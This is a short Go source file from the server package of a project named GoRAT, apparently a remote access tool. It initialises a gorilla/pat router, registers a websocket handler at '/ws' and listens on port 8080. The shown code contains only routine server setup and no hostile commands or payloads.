// Copyright (c) 2020 Elitis. All rights reserved.
// This file is part of GoRAT; see LICENSE for your rights.

package server

import (
	"net/http"

	"github.com/gorilla/pat"
)

var p *pat.Router

// Init initialises the server.
func Init() {
	p = pat.New()
	setWeb()

	http.HandleFunc("/ws", wsHandler)
	chk(http.ListenAndServe(":8080", p))
}
